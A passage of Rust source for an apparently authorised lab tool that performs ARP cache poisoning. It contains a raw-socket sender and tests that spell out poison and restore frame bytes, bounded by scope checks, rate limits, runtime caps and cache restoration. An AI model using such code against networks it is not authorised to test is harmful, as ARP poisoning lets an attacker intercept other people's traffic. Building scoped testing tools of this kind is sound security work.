    if target_count == 0 || target_count > MAX_SPOOF_PAIRS {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            format!("spoof target count must be 1..={MAX_SPOOF_PAIRS}"),
        ));
    }
    let candidates: Vec<Ipv4Addr> = set
        .targets
        .iter()
        .copied()
        .filter(|&t| t != gateway)
        .collect();
    if candidates.is_empty() {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            "the saved lab scope has no IPv4 target distinct from the gateway — ARP \
             spoofing needs at least one target host besides the gateway",
        ));
    }
    if candidates.len() < target_count {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            format!(
                "requested {target_count} spoof targets but the saved lab scope resolves \
                 only {} distinct IPv4 hosts besides the gateway — lower the target count \
                 or widen the scope",
                candidates.len()
            ),
        ));
    }
    let pairs: Vec<SpoofPair> = candidates
        .into_iter()
        .take(target_count)
        .map(|target| SpoofPair { target, gateway })
        .collect();
    for pair in &pairs {
        if !scope_contains(set, pair.target) {
            return Err(SpoofError::new(
                SpoofErrorCode::InvalidScope,
                format!(
                    "refusing to spoof {}: outside the saved lab scope (Target 1 ∪ Target 2)",
                    pair.target
                ),
            ));
        }
    }
    Ok(pairs)
}

// ---------------------------------------------------------------------------
// Linux socket shim (AF_PACKET, CAP_NET_RAW). Mirrors active_arp.rs: no
// promiscuous mode, no interface flag changes, honest error codes.
// ---------------------------------------------------------------------------

#[cfg(target_os = "linux")]
mod linux {
    use super::*;
    use cyberdeck_packet::live::{discover_interfaces, select_interface};
    use std::ffi::{c_int, c_ulong, c_void};
    use std::io;
    use std::os::fd::RawFd;
    use std::path::Path;
    use std::time::{Duration, Instant};

    const AF_PACKET: c_int = 17;
    const AF_INET: c_int = 2;
    const SOCK_RAW: c_int = 3;
    const SOCK_DGRAM: c_int = 2;
    const SOCK_CLOEXEC: c_int = 0o2000000;
    const ETH_P_ARP: u16 = 0x0806;
    const POLLIN: i16 = 1;
    const SIOCGIFADDR: c_ulong = 0x8915;

    #[repr(C)]
    struct SockAddrLl {
        family: u16,
        protocol: u16,
        ifindex: c_int,
        hatype: u16,
        pkttype: u8,
        halen: u8,
        addr: [u8; 8],
    }
    #[repr(C)]
    struct PollFd {
        fd: c_int,
        events: i16,
        revents: i16,
    }
    // Linux ifreq has IFNAMSIZ=16 with 24 bytes for its union on supported
    // 64-bit ABIs. Do not extend this implementation to non-Linux targets.
    #[repr(C)]
    struct Ifreq {
        name: [u8; 16],
        payload: [u8; 24],
    }

    unsafe extern "C" {
        fn socket(domain: c_int, typ: c_int, protocol: c_int) -> c_int;
        fn bind(fd: c_int, address: *const c_void, length: u32) -> c_int;
        fn send(fd: c_int, data: *const c_void, length: usize, flags: c_int) -> isize;
        fn recv(fd: c_int, data: *mut c_void, length: usize, flags: c_int) -> isize;
        fn poll(fds: *mut PollFd, count: usize, timeout: c_int) -> c_int;
        fn ioctl(fd: c_int, request: c_ulong, arg: *mut c_void) -> c_int;
        fn close(fd: c_int) -> c_int;
    }

    struct Fd(RawFd);
    impl Drop for Fd {
        fn drop(&mut self) {
            unsafe {
                close(self.0);
            }
        }
    }

    fn io_err(context: &str) -> SpoofError {
        let err = io::Error::last_os_error();
        let code = if err.kind() == io::ErrorKind::PermissionDenied {
            SpoofErrorCode::Permission
        } else {
            SpoofErrorCode::Io
        };
        SpoofError::new(code, format!("{context}: {err}"))
    }

    fn interface_ipv4(fd: c_int, name: &str) -> Result<Ipv4Addr, SpoofError> {
        if name.is_empty() || name.len() >= 16 {
            return Err(SpoofError::new(
                SpoofErrorCode::InvalidScope,
                "invalid selected network interface name",
            ));
        }
        let mut req = Ifreq {
            name: [0; 16],
            payload: [0; 24],
        };
        req.name[..name.len()].copy_from_slice(name.as_bytes());
        if unsafe { ioctl(fd, SIOCGIFADDR, (&raw mut req).cast()) } < 0 {
            return Err(io_err("verify selected interface IPv4 configuration"));
        }
        // Linux sockaddr_in: sa_family(2), sin_port(2), sin_addr(4).
        let addr: [u8; 4] = req.payload[4..8].try_into().expect("fixed-size ifreq");
        Ok(Ipv4Addr::from(addr))
    }

    fn source_mac(name: &str) -> Result<[u8; 6], SpoofError> {
        let path = Path::new("/sys/class/net").join(name).join("address");
        let value = std::fs::read_to_string(path).map_err(|e| {
            SpoofError::new(SpoofErrorCode::Device, format!("read interface MAC: {e}"))
        })?;
        let parts: Vec<_> = value.trim().split(':').collect();
        if parts.len() != 6 {
            return Err(SpoofError::new(
                SpoofErrorCode::Device,
                "selected interface hardware address invalid",
            ));
        }
        let mut mac = [0; 6];
        for (slot, piece) in mac.iter_mut().zip(parts) {
            *slot = u8::from_str_radix(piece, 16).map_err(|_| {
                SpoofError::new(SpoofErrorCode::Device, "selected interface MAC malformed")
            })?;
        }
        if mac == [0; 6] || mac[0] & 1 != 0 {
            return Err(SpoofError::new(
                SpoofErrorCode::Device,
                "selected interface does not have a unicast MAC",
            ));
        }
        Ok(mac)
    }

    struct RunClock {
        started: Instant,
    }
    impl SpoofClock for RunClock {
        fn now_ms(&self) -> u64 {
            self.started.elapsed().as_millis().min(u64::MAX as u128) as u64
        }
        fn park(&mut self, max_ms: u64) {
            // Small slices keep stop/timeout latency at ~20 ms. Frames
            // arriving meanwhile sit in the socket buffer and are drained
            // right after the park.
            std::thread::sleep(Duration::from_millis(max_ms.min(MAX_PARK_MS)));
        }
    }

    pub(super) fn run(
        interface_name: &str,
        pairs: &[SpoofPair],
        rate_per_sec: u32,
        stop: &AtomicBool,
        scope_active: &(impl Fn() -> bool + Sync),
        sent_counter: &AtomicU64,
    ) -> Result<SpoofOutcome, SpoofError> {
        let all = discover_interfaces()
            .map_err(|e| SpoofError::new(SpoofErrorCode::Device, e.message))?;
        let selected = select_interface(&all, interface_name)
            .map_err(|e| SpoofError::new(SpoofErrorCode::Device, e.message))?;
        let our_mac = source_mac(&selected.name)?;
        let ip_fd = Fd(unsafe { socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0) });
        if ip_fd.0 < 0 {
            return Err(io_err("open interface address verification socket"));
        }
        let our_ip = interface_ipv4(ip_fd.0, &selected.name)?;
        let protocol = ETH_P_ARP.to_be();
        let fd = Fd(unsafe { socket(AF_PACKET, SOCK_RAW | SOCK_CLOEXEC, c_int::from(protocol)) });
        if fd.0 < 0 {
            return Err(io_err("open authorized ARP raw interface"));
        }
        let index = c_int::try_from(selected.index).map_err(|_| {
            SpoofError::new(
                SpoofErrorCode::Device,
                "network interface index exceeds native range",
            )
        })?;
        let addr = SockAddrLl {
            family: AF_PACKET as u16,
            protocol,
            ifindex: index,
            hatype: 0,
            pkttype: 0,
            halen: 0,
            addr: [0; 8],
        };
        if unsafe {
            bind(
                fd.0,
                (&raw const addr).cast(),
                std::mem::size_of::<SockAddrLl>() as u32,
            )
        } < 0
        {
            return Err(io_err("bind selected Ethernet interface for ARP"));
        }
        let raw_fd = fd.0;
        let mut clock = RunClock {
            started: Instant::now(),
        };
        let send_frame = |frame: &[u8; ARP_FRAME_LEN]| -> Result<(), SpoofError> {
            let sent = unsafe { send(raw_fd, frame.as_ptr().cast(), frame.len(), 0) };
            if sent != frame.len() as isize {
                return Err(io_err(
                    "send one authorized ARP frame on the selected interface",
                ));
            }
            Ok(())
        };
        let mut frame_buffer = [0u8; 2048];
        let drain = |ledger: &mut MacLedger| {
            for _ in 0..64 {
                let mut pfd = PollFd {
                    fd: raw_fd,
                    events: POLLIN,
                    revents: 0,
                };
                let polled = unsafe { poll(&raw mut pfd, 1, 0) };
                if polled <= 0 || pfd.revents & POLLIN == 0 {
                    break;
                }
                let size = unsafe {
                    recv(
                        raw_fd,
                        frame_buffer.as_mut_ptr().cast(),
                        frame_buffer.len(),
                        0,
                    )
                };
                if size <= 0 {
                    break;
                }
                if let Some(view) = parse_arp_frame(&frame_buffer[..size as usize]) {
                    ledger.observe(
                        view.sender_ip,
                        view.sender_mac,
                        view.eth_src,
                        our_mac,
                        pairs,
                    );
                }
            }
        };
        let mut outcome = run_spoof_loop(
            pairs,
            rate_per_sec,
            our_mac,
            our_ip,
            stop,
            scope_active,
            &mut clock,
            sent_counter,
            &mut send_frame,
            &mut drain,
        )?;
        // Publish the authoritative total (loop counter + restoration frames).
        outcome.packets_sent = sent_counter.load(Ordering::Acquire);
        Ok(outcome)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;
    use std::sync::Mutex;

    const OUR: [u8; 6] = [0x02, 0x00, 0x00, 0x00, 0x00, 0x01];
    const GW: [u8; 6] = [0x02, 0x00, 0x00, 0x00, 0x00, 0xfe];
    const T1: [u8; 6] = [0x02, 0x00, 0x00, 0x00, 0x00, 0x02];
    fn ip(v: [u8; 4]) -> Ipv4Addr {
        Ipv4Addr::from(v)
    }
    fn pair() -> SpoofPair {
        SpoofPair {
            target: ip([10, 0, 0, 5]),
            gateway: ip([10, 0, 0, 1]),
        }
    }
    fn reply_opcode(frame: &[u8; ARP_FRAME_LEN]) -> bool {
        frame[20..22] == 2u16.to_be_bytes()
    }
    fn request_opcode(frame: &[u8; ARP_FRAME_LEN]) -> bool {
        frame[20..22] == 1u16.to_be_bytes()
    }

    /// Hand-built fixture: full-duplex poison frames must be exactly these
    /// bytes — unicast Ethernet + ARP reply claiming the peer's IP with OUR
    /// MAC, victim fields filled when the peer's MAC is known.
    #[test]
    fn poison_frames_match_hand_built_fixtures_in_both_directions() {
        let p = pair();
        let known = poison_frame_to_target(p, OUR, Some(T1)).expect("target-side frame");
        let mut expected = [0u8; 42];
        expected[..6].copy_from_slice(&T1); // Ethernet dst: the target's real MAC
        expected[6..12].copy_from_slice(&OUR); // Ethernet src: OUR interface
        expected[12..14].copy_from_slice(&0x0806u16.to_be_bytes());
        expected[14..16].copy_from_slice(&1u16.to_be_bytes());
        expected[16..18].copy_from_slice(&0x0800u16.to_be_bytes());
        expected[18] = 6;
        expected[19] = 4;
        expected[20..22].copy_from_slice(&2u16.to_be_bytes()); // reply
        expected[22..28].copy_from_slice(&OUR); // claims OUR MAC
        expected[28..32].copy_from_slice(&[10, 0, 0, 1]); // ...for the gateway IP
        expected[32..38].copy_from_slice(&T1); // ARP target MAC
        expected[38..42].copy_from_slice(&[10, 0, 0, 5]); // ARP target IP
        assert_eq!(known, expected);

        let unknown = poison_frame_to_gateway(p, OUR, None).expect("gateway-side frame");
        assert_eq!(&unknown[..6], &[0xff; 6], "unknown peer MAC broadcasts");
        assert_eq!(&unknown[6..12], &OUR);
        assert_eq!(&unknown[20..22], &2u16.to_be_bytes());
        assert_eq!(&unknown[22..28], &OUR, "claims OUR MAC");
        assert_eq!(&unknown[28..32], &[10, 0, 0, 5], "for the target IP");
        assert_eq!(&unknown[32..38], &[0; 6], "victim MAC zero when unknown");
        assert_eq!(
            &unknown[38..42],
            &[10, 0, 0, 1],
            "ARP target is the gateway"
        );
    }

    #[test]
    fn restore_frames_carry_real_macs_not_our_own() {
        let p = pair();
        let to_target = restore_frame_to_target(p, OUR, GW, Some(T1)).expect("frame");
        assert_eq!(&to_target[6..12], &OUR, "we still transmit");
        assert_eq!(
            &to_target[22..28],
            &GW,
            "payload claims the gateway's REAL MAC"
        );
        assert_eq!(&to_target[28..32], &[10, 0, 0, 1]);
        assert_eq!(&to_target[38..42], &[10, 0, 0, 5]);
        let to_gateway = restore_frame_to_gateway(p, OUR, T1, Some(GW)).expect("frame");
        assert_eq!(
            &to_gateway[22..28],
            &T1,
            "payload claims the target's REAL MAC"
        );
        assert_eq!(&to_gateway[28..32], &[10, 0, 0, 5]);
        assert_eq!(&to_gateway[32..38], &GW, "ARP target MAC is the gateway");
        assert_eq!(&to_gateway[38..42], &[10, 0, 0, 1]);
        // Broadcast-delivered when a victim MAC is unknown.
        let bcast = restore_frame_to_target(p, OUR, GW, None).expect("frame");
        assert_eq!(&bcast[..6], &[0xff; 6]);
    }

    #[test]
    fn solicited_recovery_request_is_a_legitimate_broadcast_request() {
        let f = arp_request_frame(OUR, ip([10, 0, 0, 9]), ip([10, 0, 0, 1])).expect("frame");
        assert_eq!(&f[..6], &[0xff; 6]);
        assert_eq!(&f[6..12], &OUR);
        assert!(request_opcode(&f));
        assert_eq!(&f[22..28], &OUR, "sender is OUR real identity");
        assert_eq!(&f[28..32], &[10, 0, 0, 9]);
        assert_eq!(&f[32..38], &[0; 6]);
        assert_eq!(&f[38..42], &[10, 0, 0, 1]);
    }

    #[test]
    fn frame_builders_refuse_invalid_identities_and_self_claims() {
        let p = pair();
        let zero = [0u8; 6];
        let multi = [0x03, 0, 0, 0, 0, 1]; // multicast bit set
        assert!(arp_reply_frame(zero, BROADCAST_MAC, OUR, p.gateway, zero, p.target).is_err());
        assert!(arp_reply_frame(OUR, multi, OUR, p.gateway, zero, p.target).is_err());
        assert!(arp_reply_frame(OUR, BROADCAST_MAC, zero, p.gateway, zero, p.target).is_err());
        assert!(arp_reply_frame(OUR, BROADCAST_MAC, multi, p.gateway, zero, p.target).is_err());
        assert!(
            arp_reply_frame(OUR, BROADCAST_MAC, OUR, ip([224, 0, 0, 1]), zero, p.target).is_err()
        );
        assert!(
            arp_reply_frame(OUR, BROADCAST_MAC, OUR, ip([10, 0, 0, 255]), zero, p.target).is_ok()
        );
        assert!(
            arp_reply_frame(
                OUR,
                BROADCAST_MAC,
                OUR,
                ip([255, 255, 255, 255]),
                zero,
                p.target
            )
            .is_err()
        );
        assert!(arp_reply_frame(OUR, BROADCAST_MAC, OUR, p.target, zero, p.target).is_err());
        assert!(arp_request_frame(zero, ip([10, 0, 0, 9]), p.gateway).is_err());
        assert!(arp_request_frame(OUR, ip([10, 0, 0, 9]), ip([10, 0, 0, 9])).is_err());
        // A known victim MAC must still be unicast: multicast refused.
        assert!(poison_frame_to_target(p, OUR, Some(multi)).is_err());
    }

    #[test]
    fn parser_reads_requests_and_replies_and_rejects_garbage() {
        let poison = poison_frame_to_target(pair(), OUR, Some(T1)).expect("frame");
        let view = parse_arp_frame(&poison).expect("parses");
        assert_eq!(view.eth_src, OUR);
        assert_eq!(view.operation, 2);
        assert_eq!(view.sender_mac, OUR);
        assert_eq!(view.sender_ip, ip([10, 0, 0, 1]));
        let request = arp_request_frame(OUR, ip([10, 0, 0, 9]), ip([10, 0, 0, 1])).expect("frame");
        let view = parse_arp_frame(&request).expect("parses");
        assert_eq!(view.operation, 1);
        assert_eq!(view.sender_ip, ip([10, 0, 0, 9]));
        // Rejections: short frame, wrong ethertype, bad lengths, bad opcode.
        assert!(parse_arp_frame(&poison[..20]).is_none());
        let mut not_arp = poison;
        not_arp[12..14].copy_from_slice(&0x0800u16.to_be_bytes());
        assert!(parse_arp_frame(&not_arp).is_none());
        let mut bad_len = poison;
        bad_len[18] = 8;
        assert!(parse_arp_frame(&bad_len).is_none());
        let mut bad_op = poison;
        bad_op[20..22].copy_from_slice(&9u16.to_be_bytes());
        assert!(parse_arp_frame(&bad_op).is_none());
    }

    #[test]
    fn rate_limiter_paces_rounds_without_burst_catchup() {
        let mut pacer = SpoofPacer::new(1).expect("rate 1");
        assert_eq!(pacer.interval_ms(), 1000);
        assert!(pacer.ready(0));
        pacer.advance(0);
        assert!(!pacer.ready(999));
        assert!(pacer.ready(1000));
        // A stalled worker does not owe a burst: advancing late schedules the
        // next round from NOW, not from the overdue deadline.
        pacer.advance(50_000);
        assert!(!pacer.ready(50_999));
        assert!(pacer.ready(51_000));
        let fast = SpoofPacer::new(10).expect("rate 10");
        assert_eq!(fast.interval_ms(), 100);
        for rate in [0, 11, 100] {
            assert!(SpoofPacer::new(rate).is_err(), "rate {rate} refused");
            assert!(validate_rate(rate).is_err());
        }
        assert_eq!(DEFAULT_SPOOF_RATE_PER_SEC, 1);
        assert_eq!(MAX_SPOOF_RATE_PER_SEC, 10);
    }

    #[test]
    fn pair_validation_refuses_bad_counts_gateways_and_duplicates() {
        let p = pair();
        assert!(validate_pairs(&[]).is_err());
        let over = vec![p; MAX_SPOOF_PAIRS + 1];
        assert!(validate_pairs(&over).is_err());
        assert!(validate_pairs(&[p]).is_ok());
        let at_cap: Vec<SpoofPair> = (0..MAX_SPOOF_PAIRS)
            .map(|i| SpoofPair {
                target: ip([10, 0, 0, i as u8 + 2]),
                gateway: p.gateway,
            })
            .collect();
        assert!(validate_pairs(&at_cap).is_ok());
        let mixed = vec![
            p,
            SpoofPair {
                target: p.target,
                gateway: ip([10, 0, 0, 254]),
            },
        ];
        assert!(validate_pairs(&mixed).is_err(), "one gateway per run");
        let self_pair = SpoofPair {
            target: p.gateway,
            gateway: p.gateway,
        };
        assert!(validate_pairs(&[self_pair]).is_err());
        let dupe = vec![p, p];
        assert!(validate_pairs(&dupe).is_err());
        let broadcast_target = SpoofPair {
            target: ip([255, 255, 255, 255]),
            gateway: p.gateway,
        };
        assert!(validate_pairs(&[broadcast_target]).is_err());
    }

    #[test]
    fn scope_resolution_expands_ipv4_and_skips_ipv6_honestly() {
        let entries = |list: &[&str]| list.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        let set = build_scope_set(
            &entries(&["10.0.0.5", "2001:db8::/64"]),
            &entries(&["10.0.0.9", "192.168.1.4/30"]),
            MAX_SPOOF_PAIRS,
        )
        .expect("scope resolves");
        assert_eq!(
            set.targets,
            vec![
                ip([10, 0, 0, 5]),
                ip([10, 0, 0, 9]),
                ip([192, 168, 1, 5]),
                ip([192, 168, 1, 6])
            ]
        );
        assert!(build_scope_set(&entries(&["2001:db8::1"]), &[], MAX_SPOOF_PAIRS).is_err());
        assert!(build_scope_set(&entries(&["router.local"]), &[], MAX_SPOOF_PAIRS).is_err());
        assert!(build_scope_set(&entries(&["10.0.0.0/33"]), &[], MAX_SPOOF_PAIRS).is_err());
        let over: Vec<String> = (0..MAX_SPOOF_PAIRS as u64 + 1)
            .map(|i| format!("10.0.{i}.1"))
            .collect();
        let err = build_scope_set(&over, &[], MAX_SPOOF_PAIRS).unwrap_err();
        assert!(err.message.contains("narrow the scope"), "{err:?}");
    }

    #[test]
    fn out_of_scope_gateways_and_targets_are_refused_with_explicit_errors() {
        let entries = |list: &[&str]| list.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        let set = build_scope_set(
            &entries(&["10.0.0.1", "10.0.0.5", "10.0.0.9"]),
            &[],
            MAX_SPOOF_PAIRS,
        )
        .expect("scope resolves");
        let gw = ip([10, 0, 0, 1]);
        assert!(scope_contains(&set, gw));
        let outsider = ip([192, 168, 9, 9]);
        assert!(!scope_contains(&set, outsider));
        let err = build_spoof_pairs(&set, outsider, 1).unwrap_err();
        assert!(
            err.message.contains("outside the saved lab scope"),
            "{err:?}"
        );
        // Over-asking refuses with guidance instead of silent truncation:
        // only the two scope hosts besides the gateway are usable.
        let err = build_spoof_pairs(&set, gw, 3).unwrap_err();
        assert!(err.message.contains("lower the target count"), "{err:?}");
        let pairs = build_spoof_pairs(&set, gw, 2).expect("pairs");
        assert_eq!(
            pairs,
            vec![
                SpoofPair {
                    target: ip([10, 0, 0, 5]),
                    gateway: gw
                },
                SpoofPair {
                    target: ip([10, 0, 0, 9]),
                    gateway: gw
                },
            ]
        );
        // The gateway is never a poison target: validate_pairs refuses the
        // pair outright and build_spoof_pairs filters it from candidates.
        assert!(
            validate_pairs(&[SpoofPair {
                target: gw,
                gateway: gw,
            }])
            .is_err()
        );
    }

    #[test]
    fn ledger_learns_real_macs_and_ignores_our_own_claims() {
        let mut ledger = MacLedger::default();
        let p = pair();
        // Our looped-back poison frame: filtered by our own MACs.
        assert!(!ledger.observe(p.gateway, OUR, OUR, OUR, &[p]));
        assert_eq!(ledger.gateway_mac(), None);
        // A real gateway announcement is learned.
        assert!(ledger.observe(p.gateway, GW, GW, OUR, &[p]));
        assert_eq!(ledger.gateway_mac(), Some(GW));
        // First claim wins: a later different claim cannot rewrite history.
        assert!(!ledger.observe(p.gateway, T1, T1, OUR, &[p]));
        assert_eq!(ledger.gateway_mac(), Some(GW));
        // The target's own request carries its real binding.
        assert!(ledger.observe(p.target, T1, T1, OUR, &[p]));
        assert_eq!(ledger.target_mac(p.target), Some(T1));
        // Claims for addresses outside the pair set are ignored.
        assert!(!ledger.observe(ip([10, 0, 0, 77]), GW, GW, OUR, &[p]));
        // Broadcast/zero claims are never identities.
        assert!(!ledger.observe(p.gateway, BROADCAST_MAC, BROADCAST_MAC, OUR, &[p]));
        assert!(!ledger.observe(p.gateway, [0; 6], T1, OUR, &[p]));
    }

    /// Deterministic fake clock for loop tests: `park` advances time.
    struct FakeClock {
        now: u64,
    }
    impl SpoofClock for FakeClock {
        fn now_ms(&self) -> u64 {
            self.now
        }
        fn park(&mut self, max_ms: u64) {
            self.now += max_ms;
        }
    }

    /// Operator stop ends poisoning mid-run and the restoration pass still
    /// runs — with nothing learned it probes honestly and reports unknowns.
    #[test]
    fn stop_semantics_end_poisoning_and_still_restore() {
        let p = pair();
        let stop = Arc::new(AtomicBool::new(false));
        let stop_flag = Arc::clone(&stop);
        let mut clock = FakeClock { now: 0 };
        let counter = AtomicU64::new(0);
        let sent: Arc<Mutex<Vec<u8>>> = Arc::new(Mutex::new(Vec::new()));
        let log = Arc::clone(&sent);
        let mut send = move |frame: &[u8; ARP_FRAME_LEN]| -> Result<(), SpoofError> {
            let mut log = log.lock().unwrap();
            if reply_opcode(frame) {
                log.push(2);
                // Operator hits stop once six poison replies have gone out.
                if log.iter().filter(|&&op| op == 2).count() == 6 {
                    stop_flag.store(true, Ordering::Release);
                }
            } else {
                log.push(1);
            }
            Ok(())
        };
        let mut drain = |_ledger: &mut MacLedger| {};
        let outcome = run_spoof_loop(
            &[p],
            10,
            OUR,
            ip([10, 0, 0, 9]),
            &stop,
            &|| true,
            &mut clock,
            &counter,
            &mut send,
            &mut drain,
        )
        .expect("run completes");
        assert_eq!(outcome.end_reason, SpoofEndReason::OperatorStop);
        // Six poison replies, then FOUR bounded solicited recovery requests
        // (2 for the gateway + 2 for the target) — no fabricated restore
        // replies, because nothing real was ever learned.
        let log = sent.lock().unwrap();
        assert_eq!(log.iter().filter(|&&op| op == 2).count(), 6);
        assert_eq!(log.iter().filter(|&&op| op == 1).count(), 4);
        assert_eq!(outcome.restoration.packets_sent, 4);
        assert_eq!(outcome.packets_sent, 10);
        assert_eq!(counter.load(Ordering::Acquire), 10);
        assert!(!outcome.restoration.gateway_mac_known);
        assert_eq!(outcome.restoration.targets_restored, 0);
        assert_eq!(outcome.restoration.unknown_target_macs, vec![p.target]);
        assert_eq!(outcome.error, None);
        assert_eq!(outcome.rounds, 3);
    }

    #[test]
    fn runtime_cap_auto_stops_the_run() {
        let p = pair();
        let stop = AtomicBool::new(false);
        let mut clock = FakeClock { now: 0 };
        let counter = AtomicU64::new(0);
        let mut send = |_: &[u8; ARP_FRAME_LEN]| -> Result<(), SpoofError> { Ok(()) };
        let mut drain = |_ledger: &mut MacLedger| {};
        let outcome = run_spoof_loop(
            &[p],
            10,
            OUR,
            ip([10, 0, 0, 9]),
            &stop,
            &|| true,
            &mut clock,
            &counter,
            &mut send,
            &mut drain,
        )
        .expect("run completes");
        assert_eq!(outcome.end_reason, SpoofEndReason::RuntimeCapReached);
        assert!(clock.now_ms() >= MAX_SPOOF_RUNTIME_MS);
        // rate 10 -> one 100ms round of 2 frames each; 18000 rounds in 30 min,
        // then the restoration pass probes the two unlearned identities.
        assert_eq!(outcome.rounds, 18_000);
        assert_eq!(outcome.packets_sent, 36_004);
        assert_eq!(outcome.restoration.packets_sent, 4);
        assert!(!outcome.restoration.gateway_mac_known);
        assert_eq!(outcome.restoration.unknown_target_macs, vec![p.target]);
    }

    /// Learned real MACs switch poison frames to unicast delivery and make
    /// the restoration pass fully restore both directions.
    #[test]
    fn learned_macs_drive_unicast_frames_and_full_restoration() {
        let p = pair();
        let stop = Arc::new(AtomicBool::new(false));
        let stop_flag = Arc::clone(&stop);
        let mut clock = FakeClock { now: 0 };
        let counter = AtomicU64::new(0);
        let saw_unicast = Arc::new(AtomicBool::new(false));
        let unicast_flag = Arc::clone(&saw_unicast);
        let mut replies = 0u64;
        let mut send = move |frame: &[u8; ARP_FRAME_LEN]| -> Result<(), SpoofError> {
            if reply_opcode(frame) {
                replies += 1;
                if frame[..6] != BROADCAST_MAC {
                    unicast_flag.store(true, Ordering::Release);
                }
                if replies == 4 {
                    stop_flag.store(true, Ordering::Release);
                }
            }
            Ok(())
        };
        let mut drain = move |ledger: &mut MacLedger| {
            // Peers announce their real MACs right after the first round;
            // observe() is first-wins, so repeated calls stay harmless.
            ledger.observe(p.gateway, GW, GW, OUR, &[p]);
            ledger.observe(p.target, T1, T1, OUR, &[p]);
        };
        let outcome = run_spoof_loop(
            &[p],
            1,
            OUR,
            ip([10, 0, 0, 9]),
            &stop,
            &|| true,
            &mut clock,
            &counter,
            &mut send,
            &mut drain,
        )
        .expect("run completes");
        assert_eq!(outcome.end_reason, SpoofEndReason::OperatorStop);
        assert!(
            saw_unicast.load(Ordering::Acquire),
            "learned MACs go unicast"
        );
        assert!(outcome.restoration.gateway_mac_known);
        assert_eq!(outcome.restoration.targets_restored, 1);
        assert_eq!(outcome.restoration.gateway_entries_restored, 1);
        assert!(outcome.restoration.unknown_target_macs.is_empty());
        assert_eq!(outcome.restoration.packets_sent, 2);
    }

    /// Scope revocation mid-run ends the run AND still restores with the
    /// learned truth: leaving poisoned caches after a revoke is unacceptable.
    #[test]
    fn scope_revocation_mid_run_ends_the_run_and_restores() {
        let p = pair();
        let stop = AtomicBool::new(false);
        let mut clock = FakeClock { now: 0 };
        let counter = AtomicU64::new(0);
        let scope_flag = Arc::new(AtomicBool::new(true));
        let flag_for_send = Arc::clone(&scope_flag);
        let mut frames = 0u64;
        let mut send = move |_: &[u8; ARP_FRAME_LEN]| -> Result<(), SpoofError> {
            frames += 1;
            // Two frames = one round; revoke the scope after round one.
            if frames >= 2 {
                flag_for_send.store(false, Ordering::Release);
            }
            Ok(())
        };
        let mut drain = move |ledger: &mut MacLedger| {
            ledger.observe(p.gateway, GW, GW, OUR, &[p]);
        };
        let scope = || scope_flag.load(Ordering::Acquire);
        let outcome = run_spoof_loop(
            &[p],
            1,
            OUR,
            ip([10, 0, 0, 9]),
            &stop,
            &scope,
            &mut clock,
            &counter,
            &mut send,
            &mut drain,
        )
        .expect("run completes");
        assert_eq!(outcome.end_reason, SpoofEndReason::ScopeRevoked);
        assert!(
            outcome.restoration.gateway_mac_known,
            "the learned MAC still restores"
        );
        assert_eq!(outcome.restoration.targets_restored, 1);
        assert_eq!(outcome.restoration.unknown_target_macs, vec![p.target]);
    }

    #[test]
    fn send_failure_mid_run_still_attempts_restoration() {
        let p = pair();
        let stop = AtomicBool::new(false);
        let mut clock = FakeClock { now: 0 };
        let counter = AtomicU64::new(0);
        let mut sends = 0u64;
        let mut send = move |_: &[u8; ARP_FRAME_LEN]| -> Result<(), SpoofError> {
            sends += 1;
            if sends > 2 {
                return Err(SpoofError::new(SpoofErrorCode::Io, "interface went down"));
            }
            Ok(())
        };
        let mut drain = |_ledger: &mut MacLedger| {};
        let outcome = run_spoof_loop(
            &[p],
            10,
            OUR,
            ip([10, 0, 0, 9]),
            &stop,
            &|| true,
            &mut clock,
            &counter,
            &mut send,
            &mut drain,
        )
        .expect("run completes");
        assert_eq!(outcome.end_reason, SpoofEndReason::SendFailure);
        assert_eq!(outcome.error.map(|e| e.code), Some(SpoofErrorCode::Io));
        // Restoration attempts run but cannot transmit on the dead interface:
        // the report honestly shows zero restored and the unknown list.
        assert_eq!(outcome.restoration.targets_restored, 0);
        assert_eq!(outcome.restoration.packets_sent, 0);
        assert_eq!(outcome.restoration.unknown_target_macs, vec![p.target]);
    }

    #[test]
    fn preflight_refuses_empty_oversized_or_malformed_pairs() {
        let stop = AtomicBool::new(false);
        let counter = AtomicU64::new(0);
        let p = pair();
        assert!(run_arp_spoof("eth0", &[], 1, &stop, &|| true, &counter).is_err());
        let over = vec![p; MAX_SPOOF_PAIRS + 1];
        assert!(run_arp_spoof("eth0", &over, 1, &stop, &|| true, &counter).is_err());
        assert!(run_arp_spoof("eth0", &[p], 0, &stop, &|| true, &counter).is_err());
        assert!(run_arp_spoof("eth0", &[p], 11, &stop, &|| true, &counter).is_err());
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn spoofing_reports_unsupported_off_linux_regardless_of_scope() {
        let stop = AtomicBool::new(false);
        let counter = AtomicU64::new(0);
        let p = pair();
        let outcome = run_arp_spoof("lo0", &[p], 1, &stop, &|| true, &counter);
        assert!(matches!(
            outcome,
            Err(SpoofError {
                code: SpoofErrorCode::Unsupported,
                ..
            })
        ));
    }

    #[test]
    #[cfg(target_os = "linux")]
    fn revoked_scope_aborts_before_any_raw_transmission() {
        let stopped = AtomicBool::new(true);
        let counter = AtomicU64::new(0);
        let p = pair();
        let outcome = run_arp_spoof("lo", &[p], 1, &stopped, &|| true, &counter);
        assert!(matches!(
            outcome,
            Err(SpoofError {
                code: SpoofErrorCode::Cancelled,
                ..
            })
        ));
    }
}
